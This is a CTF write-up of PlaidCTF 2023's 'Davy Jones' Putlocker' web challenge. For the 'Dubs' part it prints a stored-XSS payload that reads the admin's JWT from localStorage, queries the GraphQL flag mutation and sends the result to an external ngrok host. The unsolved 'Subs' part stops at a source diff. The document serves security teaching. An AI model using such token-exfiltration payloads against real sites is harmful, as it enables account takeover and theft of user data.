# Davy Jones' Putlocker

## Table of Contents

- **[Dubs](#dubs)**
	1. [Overview](#overview)
	2. [Background](#background)
	3. [Enumeration](#enumeration)
	4. [Exploitation](#exploitation)
	5. [Conclusion](#conclusion)
- **[Subs](#subs)** ***(Unsolved)***
	1. [Overview](#overview)
	2. [Background](#background)
	3. [Enumeration](#enumeration)

## Background

> With Captain bluepichu and First Mates luke, zwad3, and zaratec

When I not be plunderin' the high seas, I be watchin' me favorite shows. Like any self-respectin' pirate, I don't be payin' for my media. But I'll be honest, this site even be a bit shady for me. (Note: PPP does not condone media piracy)

## Dubs

### Overview

- 350 Points / 67 Solves

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★☆☆

### Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415135626.png)

### Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/web/Davy-Jones-Putlocker/new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz):**
```shell
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Dubs)-[2023.04.15|13:59:35(HKT)]
└> file new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz 
new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz: gzip compressed data, last modified: Sat Apr 15 00:33:17 2023, from Unix, original size modulo 2^32 6245376
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Dubs)-[2023.04.15|13:59:37(HKT)]
└> tar -xf new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz 
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Dubs)-[2023.04.15|14:00:06(HKT)]
└> ls -lah part1/
total 284K
drwxr-xr-x 6 siunam nam 4.0K Apr 11 09:32 .
drwxr-xr-x 3 siunam nam 4.0K Apr 15 14:00 ..
-rw-r--r-- 1 siunam nam  947 Apr 15 06:59 docker-compose.yml
-rw-r--r-- 1 siunam nam  134 Mar 14 10:03 .editorconfig
-rw-r--r-- 1 siunam nam 2.5K Mar 14 10:04 .eslintrc.js
-rw-r--r-- 1 siunam nam  293 Apr  9 03:46 .gitignore
drwxr-xr-x 2 siunam nam 4.0K Apr 15 14:00 misc
-rw-r--r-- 1 siunam nam  515 Apr  9 03:40 package.json
drwxr-xr-x 4 siunam nam 4.0K Apr 15 14:00 packages
-rw-r--r-- 1 siunam nam   24 Mar 26 06:41 README.md
-rw-r--r-- 1 siunam nam  265 Mar 15 10:05 tsconfig.base.json
-rw-r--r-- 1 siunam nam  140 Mar 14 10:03 tsconfig.dom.json
-rw-r--r-- 1 siunam nam  127 Mar 14 10:03 tsconfig.node.json
-rw-r--r-- 1 siunam nam  458 Mar 14 10:03 turbo.json
drwxr-xr-x 2 siunam nam 4.0K Mar 15 08:54 .vscode
drwxr-xr-x 3 siunam nam 4.0K Apr 15 14:00 .yarn
-rw-r--r-- 1 siunam nam 215K Apr 10 06:45 yarn.lock
-rw-r--r-- 1 siunam nam   66 Mar 14 10:03 .yarnrc.yml
```

**We can run that web server locally via `docker-compose`:**
```shell
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Dubs/part1)-[2023.04.15|14:09:40(HKT)]
└> sudo docker-compose up --build
[...]
```

> Note: To run it locally, you must modify `PUBLIC_HOST` and `HOST` environment variable to a publicly-accessible host, you can do that via **Ngrok** port forwarding:
>  
> ```yml
> PUBLIC_HOST: ${HOST:-987a-{Redacted}.ngrok-free.app}
> [...]
> HOST=${HOST:-987a-{Redacted}.ngrok-free.app}
> ```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415145350.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415145907.png)

In here, the web application is a media piracy website, which provides free comedy and fantasy series.

Let's click on the "Over the Deck Rail":

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150057.png)

We see the description of "Over the Deck Rail".

**However, we can see there's an interesting button - "Report" under the "Genres" buttons:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150302.png)

Now, let's click one of those episode in the home page's "Recent Releases":

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150431.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150455.png)

Again, we see the "Report" button.

**Also, this web application allows users to register and login an account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150729.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150741.png)

We can try to register an account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150827.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415150939.png)

Let's click on our user profile:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415151027.png)

We can view our uploaded playlists and shows.

In "Add Show", we can add our own show:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415151154.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415151356.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415151603.png)

Then, in "Add Episode", we can select a show to create a new episode:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415151746.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415151828.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415152007.png)

Finally, we can create a new playlist in "Create Playlist":

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415152153.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415152202.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415153100.png)

Now that we have a high-level overview of the web application.

Let's view the source code!

First, let's find out where's the flag is, or what's our objective.

**In `server/src/index.mtx` line 44, we can see the flag is being fetched from the environment variable:**
```ts
[...]
const Flag = process.env["FLAG"] ?? "PCTF{fake_flag}";
[...]
```

**And it's used in GraphQL's resolvers:**
```ts
const resolvers = {
[...]
    Mutation: {
        [...]
        flag: async (
			_: {},
			args: {},
			context: Context
		) => {
			assertLoggedIn(context);
			await assertAdmin(context);

			return Flag;
		}
	}
};
```

**`server/src/auth.mts`:**
```ts
[...]
export function assertLoggedIn(context: Context): asserts context is { user: string } {
	if (context.user === undefined) {
		throw new Error("Not logged in");
	}
}

export async function assertAdmin(context: Context & { user: string }) {
	const user = await loadUser(context.user);

	if (user.name !== "admin") {
		throw new Error("Not authorized");
	}
}
```

This `flag` mutation will first check is logged in or not, then finally check the logged in user is `admin` or not.

If is admin, then return the flag to us.

We can try to test it:

```json
{
  "query": "mutation { flag }"
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415160339.png)

As expected, we're not admin and it returns "Not authorized".

So, our goal should be sending a request to the GraphQL endpoint, and use the `flag` mutation to get the flag.

But how?

**After fumbling around, I found the `report` mutation is interesting for us:**
```ts
import { checkUrl } from "./report.mjs";
[...]
report: async (_: {}, args: { url: string }) => {
    await checkUrl(args.url);
    return true;
},
```

This mutation query requires 1 argument: `url`.

**`report.mjs`:**
```ts
import puppeteer from "puppeteer";

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD ?? "password";
const PUBLIC_HOST = process.env.PUBLIC_HOST ?? "client";
const PUBLIC_PORT = process.env.PUBLIC_PORT ?? "80";

export async function checkUrl(url: string) {
	if (!url.startsWith("http://") && !url.startsWith("https://")) {
		throw new Error("Invalid URL");
	}

	const browser = await puppeteer.launch({
		executablePath: "/usr/bin/chromium",
		headless: true,
		args: [
			"--no-sandbox",
			"--disable-setuid-sandbox",
			"--js-flags=--noexpose_wasm,--jitless",
		]
	});

	try {
		console.log("[checkUrl] Logging in...");
		const loginPage = await browser.newPage();
		await loginPage.goto(`http://${PUBLIC_HOST}:${PUBLIC_PORT}/login`);
		await loginPage.type("input[placeholder='Username']", "admin");
		await loginPage.type("input[placeholder='Password']", ADMIN_PASSWORD);
		await loginPage.click("input[type='submit']");
		await new Promise((resolve) => setTimeout(resolve, 2000));
		await loginPage.close();

		console.log("[checkUrl] Going to " + url + "...");
		const page = await browser.newPage();
		await page.goto(url);
		await new Promise((resolve) => setTimeout(resolve, 10000));
		await page.close();
	} catch (error) {
		console.error("[checkUrl] Error: ", error);
		throw new Error("Failed to check URL");
	} finally {
		console.log("[checkUrl] Tearing down...");
		await browser.close();
	}
}
```

This function will **launch a Chromium browser** via library `puppeteer`.

Then, it'll open a new page and go to the web application's login page, **and login as `admin`.**

After that, it'll open a new page and **go to our supplied URL**, wait for 10 seconds and close the page.

Hmm... This looks like a **typical XSS challenge**.

**Maybe we need to exploit an XSS vulnerability, and exfiltrate the flag via GraphQL endpoint with the report mutation query??**

That being said, let's look for XSS vulnerability.

I tried to do HTML injection to test XSS, however, no dice.

**Then, I saw there's a `renderHtml.mts` file in `server/src/`:**
```ts
import { micromark } from "micromark";

export function renderHtml(content: string): string {
	return micromark(content);
}
```

Hmm? `micromark`?

> [micromark](https://www.npmjs.com/package/micromark) is a long awaited markdown parser. It uses a [state machine](https://github.com/micromark/common-markup-state-machine) to parse the entirety of markdown into concrete tokens. It’s the smallest 100% [CommonMark](https://www.npmjs.com/package/micromark#commonmark) compliant markdown parser in JavaScript. It was made to replace the internals of [`remark-parse`](https://unifiedjs.com/explore/package/remark-parse/), the most [popular](https://www.npmtrends.com/remark-parse-vs-marked-vs-markdown-it) markdown parser. Its API compiles to HTML, but its parts are made to be used separately, so as to generate syntax trees ([`mdast-util-from-markdown`](https://github.com/syntax-tree/mdast-util-from-markdown)) or compile to other output formats.

TL;DR, it's a **markdown parser** library in Node JS.

**That being said, we can use markdown syntax to display HTML code:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415203150.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415203204.png)

We can look at it's library's source code on [GitHub](https://github.com/micromark/micromark/tree/main), and right off the bat, we see this:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415215514.png)

Ahh... No luck for XSS via markdown.

**After some testing, one of my teammates said that the "Create Playlist" has no santitization, thus vulnerable to stored XSS:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415220826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415220847.png)

Nice!! We got stored XSS!!

### Exploitation

Now, we need to build a payload that fetches the flag, which is the GrahpQL endpoint's `flag` mutation query.

**XSS Payload:**
```html
<img src=x onerror="async function postData() {
const data = { 'query': 'mutation { flag }' };
const response = await fetch('https://987a-{Redacted}.ngrok-free.app/graphql', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});
const text = await response.text();
fetch('https://987a-{Redacted}.ngrok-free.app/?d=' + text);
}; postData();">
```

> Note: I tried to use `<script>` element, but it wouldn't work for me, weird.

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415223913.png)

When someone visit our user profile, it'll send a request to GrahpQL endpoint, which should returns the flag if the user is admin. Finally, exfiltrate the flag to our controlled environment.

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415223944.png)

```
client_1    | 172.21.0.1 - - [15/Apr/2023:14:39:23 +0000] "GET /?d={%22errors%22:[{%22message%22:%22Not%20logged%20in%22,%22locations%22:[{%22line%22:1,%22column%22:12}],%22path%22:[%22flag%22],%22extensions%22:{%22code%22:%22INTERNAL_SERVER_ERROR%22}}],%22data%22:{%22flag%22:null}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" "{Redacted}"
```

Nice!

**Now, we need to send our user profile URL to the `report` GrahpQL endpoint!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415224101.png)

> Note: Anyone can view users' profile.

**GrahpQL `report` payload:**
```json
{ "query": "mutation { report(url: \"https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f\") }" }
```

However, it didn't retrieve the flag...

```
client_1    | 172.21.0.1 - - [15/Apr/2023:14:43:54 +0000] "GET /?d={%22errors%22:[{%22message%22:%22Not%20logged%20in%22,%22locations%22:[{%22line%22:1,%22column%22:12}],%22path%22:[%22flag%22],%22extensions%22:{%22code%22:%22INTERNAL_SERVER_ERROR%22}}],%22data%22:{%22flag%22:null}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "{Redacted}"
```

Why it's not logged in?

**After taking a break, my teammate told me that the JWT is stored in `localStorage`!**

**`client/src/views/Login/LoginPanel.tsx`:**
```ts
[...]
const result = await login();
if (result.data?.login !== undefined) {
    localStorage.setItem("token", result.data.login);
    navigate("/");
    await client.resetStore();
}
[...]
```

**`server/src/jwt.mts`:**
```ts
import * as jwt from "jsonwebtoken";
import { z } from "zod";

const secret = process.env["JWT_SECRET"] ?? "secret";
const algorithm = "HS256";

const PayloadSchema = z.object({
	exp: z.number(),
	sub: z.string()
});

export function generateUserToken(id: string) {
	return jwt.sign({
		exp: Math.floor(Date.now() / 1000) + (60 * 60),
		sub: id
	}, secret, {
		algorithm
	});
}

export function verifyUserToken(token: string) {
	const result = jwt.verify(token, secret, {
		algorithms: [algorithm]
	});

	const payload = PayloadSchema.parse(result);

	return payload.sub;
}
```

**Sample of after logged in:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415230049.png)

With that said, we have to include the `Authorization` header with the JWT value in the request!

**Final XSS Payload:**
```html
<img src=x onerror="async function postData() {
const data = { 'query': 'mutation { flag }' };
const response = await fetch('https://987a-{Redacted}.ngrok-free.app/graphql', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': localStorage.token
    },
    body: JSON.stringify(data)
});
const text = await response.text();
fetch('https://987a-{Redacted}.ngrok-free.app/?d=' + text);
}; postData();">
```

**Then send the `report` mutation query:**
```
client_1    | 172.21.0.1 - - [15/Apr/2023:15:03:33 +0000] "GET /?d={%22data%22:{%22flag%22:%22PCTF{fake_flag}%22}} HTTP/1.1" 200 366 "https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "{Redacted}"
```

**Armed with above information, we can now work on the remote instance!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415230623.png)

However, it only has 2 minutes up-time.

Some teams wrote a solve script, however, I decided to speed run it! :D

**So, to recreate the above testing PoC, we need to:**

1. Register an account
2. Create a new playlist with the XSS payload
3. Send the `report` mutation query to the GraphQL endpoint

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230415232747.png)

**And you see the following request in Ngrok:**
```
client_1    | 172.21.0.1 - - [15/Apr/2023:15:21:05 +0000] "GET /?d={%22data%22:{%22flag%22:%22PCTF{sorry_about_all_the_networking_problems..._f252ceec1321fd285398809b}}%22}} HTTP/1.1" 200 366 "http://5c6a8576-c1e8-45d6-96f4-690cdfa8afc0.dubs.putlocker.chal.pwni.ng:20004/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.49 Safari/537.36" "44.201.232.122"
```

Bam! We got the flag!

- **Flag: `PCTF{sorry_about_all_the_networking_problems..._f252ceec1321fd285398809b}`**

### Conclusion

What we've learned:

1. Accessing High Privilege GraphQL Query Via Stored XSS

## Subs

### Overview

- 350 Points / 3 Solves

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★★

### Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416125430.png)

### Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/web/Davy-Jones-Putlocker/new-putlocker-subs.4a541aaebd390829d388a844cc6df2ec6c8769c0a4aeb1723b652421c3caa4b1.tar.gz):**
```shell
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Subs)-[2023.04.16|15:42:52(HKT)]
└> file new-putlocker-subs.4a541aaebd390829d388a844cc6df2ec6c8769c0a4aeb1723b652421c3caa4b1.tar.gz 
new-putlocker-subs.4a541aaebd390829d388a844cc6df2ec6c8769c0a4aeb1723b652421c3caa4b1.tar.gz: gzip compressed data, last modified: Sat Apr 15 00:33:17 2023, from Unix, original size modulo 2^32 6247936
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Subs)-[2023.04.16|15:42:54(HKT)]
└> tar -xf new-putlocker-subs.4a541aaebd390829d388a844cc6df2ec6c8769c0a4aeb1723b652421c3caa4b1.tar.gz 
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Subs)-[2023.04.16|15:43:01(HKT)]
└> ls -lah part2 
total 284K
drwxr-xr-x 6 siunam nam 4.0K Apr 11 09:33 .
drwxr-xr-x 3 siunam nam 4.0K Apr 16 15:43 ..
-rw-r--r-- 1 siunam nam  947 Apr 15 08:23 docker-compose.yml
-rw-r--r-- 1 siunam nam  134 Apr  9 03:40 .editorconfig
-rw-r--r-- 1 siunam nam 2.5K Apr  9 03:40 .eslintrc.js
-rw-r--r-- 1 siunam nam  293 Apr  9 03:46 .gitignore
drwxr-xr-x 2 siunam nam 4.0K Apr 16 15:43 misc
-rw-r--r-- 1 siunam nam  515 Apr  9 03:40 package.json
drwxr-xr-x 4 siunam nam 4.0K Apr 16 15:43 packages
-rw-r--r-- 1 siunam nam   24 Apr  9 03:40 README.md
-rw-r--r-- 1 siunam nam  265 Apr  9 03:40 tsconfig.base.json
-rw-r--r-- 1 siunam nam  140 Apr  9 03:40 tsconfig.dom.json
-rw-r--r-- 1 siunam nam  127 Apr  9 03:40 tsconfig.node.json
-rw-r--r-- 1 siunam nam  458 Apr  9 03:40 turbo.json
drwxr-xr-x 2 siunam nam 4.0K Apr  9 03:40 .vscode
drwxr-xr-x 3 siunam nam 4.0K Apr 16 15:43 .yarn
-rw-r--r-- 1 siunam nam 215K Apr 10 08:02 yarn.lock
-rw-r--r-- 1 siunam nam   66 Apr  9 03:40 .yarnrc.yml
```

Since we flagged part 1: Dubs, we can compare those 2 source code.

**`server/`:**
```diff
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker)-[2023.04.16|15:59:31(HKT)]
└> diff -r Dubs/part1/packages/server Subs/part2/packages/server
diff --color '--color=auto' -r Dubs/part1/packages/server/src/index.mts Subs/part2/packages/server/src/index.mts
48a49,50
> 	scalar HtmlString
> 
52c54
< 		description: String!
---
> 		description: HtmlString!
65c67
< 		description: String!
---
> 		description: HtmlString!
84c86,87
< 		description: String!
---
> 		description: HtmlString!
> 		rawDescription: String!
155a159,160
> 		description: (playlist: Playlist) => renderHtml(playlist.description),
> 		rawDescription: (playlist: Playlist) => playlist.description,
209a215
> 			await assertAdmin(context);
220a227
> 			await assertAdmin(context);
231a239
> 			await assertAdmin(context);
242a251
> 			await assertAdmin(context);
253a263
> 			await assertAdmin(context);
diff --color '--color=auto' -r Dubs/part1/packages/server/src/renderHtml.mts Subs/part2/packages/server/src/renderHtml.mts
3,4c3,10
< export function renderHtml(content: string): string {
< 	return micromark(content);
---
> export interface HtmlString {
> 	__html: string;
> }
> 
> export function renderHtml(content: string): HtmlString {
> 	return {
> 		__html: micromark(content),
> 	};
```

**In part 2: Subs, the `server/src/renderHtml.mts` has been modified:**
```ts
import { micromark } from "micromark";

export interface HtmlString {
	__html: string;
}

export function renderHtml(content: string): HtmlString {
	return {
		__html: micromark(content),
	};
}
```

**The `HtmlString` interface has a property called `__html`, and it's a string data type.**

The `renderHtml` function uses the micromark library to convert the input content string into an HTML string, which is then assigned to the `__html` property of the returned object.

The purpose of this code is to provide a simple way to convert plain text content into HTML format using the micromark library and then wrap it in an object with a special property `__html` that can be used in a React component to render the HTML content as a string without escaping HTML entities.

With that said, it may be vulnerable to **prototype pollution**??

**Then, in `server/src/index.mts`, we see this:**
```ts
[...]
        createShow: async (
			_: {},
			args: { name: string, description: string, coverUrl: string, genres: string[] },
			context: Context
		) => {
			assertLoggedIn(context);
			await assertAdmin(context);

			const id = await createShow(args.name, args.description, args.coverUrl, args.genres, context.user);
			return await loadShow(id);
		},

		updateShow: async (
			_: {},
			args: { id: string, name: string, description: string, coverUrl: string, genres: string[] },
			context: Context
		) => {
			assertLoggedIn(context);
			await assertAdmin(context);

			await updateShow(args.id, args.name, args.description, args.coverUrl, args.genres, context.user);
			return await loadShow(args.id);
		},

		createEpisode: async (
			_: {},
			args: { show: string, name: string, description: string, url: string },
			context: Context
		) => {
			assertLoggedIn(context);
			await assertAdmin(context);

			const id = await createEpisode(args.show, args.name, args.description, args.url, context.user);
			return await loadEpisode(id);
		},

		updateEpisode: async (
			_: {},
			args: { id: string, name: string, description: string, url: string },
			context: Context
		) => {
			assertLoggedIn(context);
			await assertAdmin(context);

			await updateEpisode(args.id, args.name, args.description, args.url, context.user);
			return loadEpisode(args.id);
		},

		deleteEpisode: async (
			_: {},
			args: { id: string },
			context: Context
		) => {
			assertLoggedIn(context);
			await assertAdmin(context);

			await deleteEpisode(args.id, context.user);
			return true;
		},
[...]
```

Now, GraphQL mutation query `createShow`, `updateShow`, `createEpisode`, `updateEpisode`, `deleteEpisode` **requires admin access**. So we couldn't create, update, delete show and episode.

**`client/`:**
```diff
┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker)-[2023.04.16|16:17:49(HKT)]
└> diff -r Dubs/part1/packages/client Subs/part2/packages/client 
diff --color '--color=auto' -r Dubs/part1/packages/client/nginx.conf Subs/part2/packages/client/nginx.conf
13,15c13,15
<     location /graphql {
<         proxy_pass http://server/graphql;
<     }
---
> 	location /graphql {
> 		proxy_pass http://server/graphql;
> 	}
diff --color '--color=auto' -r Dubs/part1/packages/client/src/components/EpisodePanel/EpisodePanel.tsx Subs/part2/packages/client/src/components/EpisodePanel/EpisodePanel.tsx
41c41
< 			description: string;
---
> 			description: { __html: string };
115c115
< 								dangerouslySetInnerHTML={{ __html: data.episode.description }}
---
> 								dangerouslySetInnerHTML={data.episode.description}
diff --color '--color=auto' -r Dubs/part1/packages/client/src/components/Header/Header.tsx Subs/part2/packages/client/src/components/Header/Header.tsx
46,49c46,57
< 				{" | "}
< 				<Link className={styles.link} to="/show/create">Add Show</Link>
< 				{" | "}
< 				<Link className={styles.link} to="/episode/create">Add Episode</Link>
---
> 				{
> 					data.self.name === "admin"
> 						? (
> 							<>
> 								{" | "}
> 								<Link className={styles.link} to="/show/create">Add Show</Link>
> 								{" | "}
> 								<Link className={styles.link} to="/episode/create">Add Episode</Link>
> 							</>
> 						)
> 						: undefined
> 				}
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/CreateEpisode/CreateEpisode.tsx Subs/part2/packages/client/src/views/CreateEpisode/CreateEpisode.tsx
3c3
< import { EnsureLoggedIn } from "@/components/EnsureLoggedIn";
---
> import { EnsureAdmin } from "@/components/EnsureAdmin";
11c11
< 	<EnsureLoggedIn fallback="/">
---
> 	<EnsureAdmin fallback="/">
17c17
< 	</EnsureLoggedIn>
---
> 	</EnsureAdmin>
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/CreateShow/CreateShow.tsx Subs/part2/packages/client/src/views/CreateShow/CreateShow.tsx
3c3
< import { EnsureLoggedIn } from "@/components/EnsureLoggedIn";
---
> import { EnsureAdmin } from "@/components/EnsureAdmin";
11c11
< 	<EnsureLoggedIn fallback="/">
---
> 	<EnsureAdmin fallback="/">
17c17
< 	</EnsureLoggedIn>
---
> 	</EnsureAdmin>
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/EditEpisode/EditEpisode.tsx Subs/part2/packages/client/src/views/EditEpisode/EditEpisode.tsx
4c4
< import { EnsureLoggedIn } from "@/components/EnsureLoggedIn";
---
> import { EnsureAdmin } from "@/components/EnsureAdmin";
16c16
< 		<EnsureLoggedIn fallback="/">
---
> 		<EnsureAdmin fallback="/">
22c22
< 		</EnsureLoggedIn>
---
> 		</EnsureAdmin>
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/EditShow/EditShow.tsx Subs/part2/packages/client/src/views/EditShow/EditShow.tsx
4c4
< import { EnsureLoggedIn } from "@/components/EnsureLoggedIn";
---
> import { EnsureAdmin } from "@/components/EnsureAdmin";
16c16
< 		<EnsureLoggedIn fallback="/">
---
> 		<EnsureAdmin fallback="/">
22c22
< 		</EnsureLoggedIn>
---
> 		</EnsureAdmin>
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/Home/FeaturedPanel.tsx Subs/part2/packages/client/src/views/Home/FeaturedPanel.tsx
20c20
< 			description: string;
---
> 			description: { __html: string };
52c52
< 								dangerouslySetInnerHTML={{ __html: data.featuredShow.description }}
---
> 								dangerouslySetInnerHTML={data.featuredShow.description}
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/Show/InfoPanel.tsx Subs/part2/packages/client/src/views/Show/InfoPanel.tsx
23c23
< 			description: string;
---
> 			description: { __html: string };
89c89
< 								dangerouslySetInnerHTML={{ __html: data.show.description }}
---
> 								dangerouslySetInnerHTML={data.show.description}
diff --color '--color=auto' -r Dubs/part1/packages/client/src/views/User/UserPlaylistsPanel.tsx Subs/part2/packages/client/src/views/User/UserPlaylistsPanel.tsx
24c24
< 				description: string;
---
> 				description: { __html: string };
77c77
< 										dangerouslySetInnerHTML={{ __html: playlist.description }}
---
> 										dangerouslySetInnerHTML={playlist.description}
```

As stated above, create, update, delete show and episode requires admin access. So we couldn't access to those pages, and after logged in, we shouldn't able to see "Add Show" and "Add Episode" link.

**However, we can still access to the playlist page!**

**In `client/src/views/User/UserPlaylistsPanel.tsx`, we can see this:**
```ts
[...]
<Panel
    className={classes(styles.userPlaylistsPanel, props.className)}
    title={`${data.user.name}'s Playlists`}
>
    <div className={styles.playlists}>
        {
            data.user.playlists.length === 0
                ? (
                    <div className={styles.noPlaylists}>
                        {data.user.name} has no playlists.
                    </div>
                )
                : (
                    data.user.playlists.map((playlist) => (
                        <div key={playlist.id} className={styles.playlist}>
                            <Link className={styles.name} to={`/playlist/${playlist.id}`}>
                                {playlist.name}
                            </Link>
                            <div className={styles.episodeCount}>
                                ({playlist.episodeCount} episodes)
                            </div>
                            <div
                                className={styles.description}
                                dangerouslySetInnerHTML={playlist.description}
                            />
                        </div>
                    ))
                )
        }
    </div>
</Panel>
[...]
```

Hmm... `dangerouslySetInnerHTML`?

In React JS, `dangerouslySetInnerHTML` is a property that you can use on HTML elements in a React application to programmatically set their content. Instead of using a selector to grab the HTML element, then setting its `innerHTML`, you can use this property directly on the element.

However, as the property's name suggested, it might makes the code vulnerable to XSS.

> For more information, you can read [this Medium blog](https://javascript.plainenglish.io/dangerouslysetinnerhtml-in-react-js-explained-4dfc3b80be82).

Now, let's register an account just like part 1:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416163619.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416163635.png)

**Then, try to create a new playlist with XSS PoC:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416163826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416163906.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416163947.png)

Previously, the playlist description is vulnerable to stored XSS. But now, it encodes our `<>` to HTML entities.

Hmm... What can we do now?

**In part 1: Dubs, the exploitation steps are:**

1. Create an account
2. Create a new playlist that contains the XSS payload, which sends a POST request to GrahpQL endpoint, query the `flag` mutation query, and exfiltrate the flag
